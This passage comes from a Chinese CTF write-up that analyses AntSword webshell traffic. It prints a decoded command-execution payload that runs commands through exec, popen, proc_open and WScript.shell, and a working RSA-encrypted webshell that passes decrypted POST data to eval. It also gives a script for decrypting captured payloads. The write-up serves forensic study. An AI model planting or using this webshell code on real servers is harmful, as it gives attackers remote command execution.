</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>exec</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=nv>$o</span><span class=p>,</span> <span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span><span class=p>(</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$o</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;popen&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$fp</span> <span class=o>=</span> <span class=o>@</span><span class=nx>popen</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$fp</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>fgets</span><span class=p>(</span><span class=nv>$fp</span><span class=p>,</span> <span class=mi>2048</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>pclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;proc_open&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$p</span> <span class=o>=</span> <span class=o>@</span><span class=nx>proc_open</span><span class=p>(</span><span class=nv>$c</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>),</span> <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)),</span> <span class=nv>$io</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>fgets</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>2048</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>print</span><span class=p>(</span><span class=o>@</span><span class=nx>fgets</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=mi>2048</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>fclose</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>fclose</span><span class=p>(</span><span class=nv>$io</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>proc_close</span><span class=p>(</span><span class=nv>$p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>fe</span><span class=p>(</span><span class=s1>&#39;antsystem&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>@</span><span class=nx>antsystem</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>runshellshock</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=nv>$c</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>elseif</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=s2>&#34;/&#34;</span> <span class=o>&amp;&amp;</span> <span class=o>@</span><span class=nx>class_exists</span><span class=p>(</span><span class=s2>&#34;COM&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$w</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>COM</span><span class=p>(</span><span class=s1>&#39;WScript.shell&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$e</span> <span class=o>=</span> <span class=nv>$w</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$so</span> <span class=o>=</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>StdOut</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ret</span> <span class=o>.=</span> <span class=nv>$so</span><span class=o>-&gt;</span><span class=na>ReadAll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$se</span> <span class=o>=</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>StdErr</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ret</span> <span class=o>.=</span> <span class=nv>$se</span><span class=o>-&gt;</span><span class=na>ReadAll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>print</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$ret</span> <span class=o>=</span> <span class=mi>127</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ret</span> <span class=o>=</span> <span class=o>@</span><span class=nx>runcmd</span><span class=p>(</span><span class=nv>$r</span> <span class=o>.</span> <span class=s2>&#34; 2&gt;&amp;1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>print</span> <span class=p>(</span><span class=nv>$ret</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>?</span> <span class=s2>&#34;ret=</span><span class=si>{</span><span class=nv>$ret</span><span class=si>}</span><span class=s2>&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;ERROR://&#34;</span> <span class=o>.</span> <span class=nv>$e</span><span class=o>-&gt;</span><span class=na>getMessage</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nx>asoutput</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=rsa><span>RSA</span>
<a href=#rsa class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;ant&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$pk</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>-----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx
</span></span></span><span class=line><span class=cl><span class=s>PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ
</span></span></span><span class=line><span class=cl><span class=s>5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J
</span></span></span><span class=line><span class=cl><span class=s>RAcfJSQCvaw6O8uq3wIDAQAB
</span></span></span><span class=line><span class=cl><span class=s>-----END PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cmds</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$pk</span> <span class=o>=</span> <span class=nx>openssl_pkey_get_public</span><span class=p>(</span><span class=nv>$pk</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$cmds</span> <span class=k>as</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>openssl_public_decrypt</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$value</span><span class=p>),</span> <span class=nv>$de</span><span class=p>,</span> <span class=nv>$pk</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cmd</span> <span class=o>.=</span> <span class=nv>$de</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>openssl_public_decrypt</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$v</span><span class=p>),</span> <span class=nv>$de</span><span class=p>,</span> <span class=nv>$pk</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=nv>$_POST</span><span class=p>[</span><span class=nv>$k</span><span class=p>]</span><span class=o>=</span><span class=nv>$de</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p>可以直接用CTF-NetA一把梭</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250515121850746.png alt=/posts/5422d65/imgs/image-20250515121850746.png height=980 width=1500></p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250515121856215.png alt=/posts/5422d65/imgs/image-20250515121856215.png height=980 width=1500></p><p>当然，我们也可以自己写个 PHP 脚本导入公钥解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 常规蚁剑的马
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$pk</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;</span><span class=dl>EOF</span><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>-----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh
</span></span></span><span class=line><span class=cl><span class=s>TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j
</span></span></span><span class=line><span class=cl><span class=s>OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A
</span></span></span><span class=line><span class=cl><span class=s>LzrcBi88Eu7oZaPANwIDAQAB
</span></span></span><span class=line><span class=cl><span class=s>-----END PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$cmds</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$pk</span> <span class=o>=</span> <span class=nx>openssl_pkey_get_public</span><span class=p>(</span><span class=nv>$pk</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$cmds</span> <span class=k>as</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>openssl_public_decrypt</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$value</span><span class=p>),</span> <span class=nv>$de</span><span class=p>,</span> <span class=nv>$pk</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cmd</span> <span class=o>.=</span> <span class=nv>$de</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
